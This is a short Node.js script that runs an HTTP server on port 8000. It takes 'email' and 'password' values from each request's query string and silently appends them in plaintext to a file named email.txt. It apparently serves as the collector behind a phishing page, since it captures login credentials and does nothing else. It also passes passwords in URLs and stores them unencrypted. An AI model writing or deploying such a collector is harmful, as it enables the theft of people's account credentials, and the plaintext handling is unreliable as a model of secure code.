const http = require('http');
const url = require('url');
const fs = require('fs');


const server = http.createServer((req, res) => {
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/plain');
  console.log(url.parse(req.url,true).query);
  fs.appendFile('email.txt', url.parse(req.url,true).query.email + ' ' + url.parse(req.url,true).query.password + '\n', function (err) {
  
});
  res.end();
});




server.listen(8000);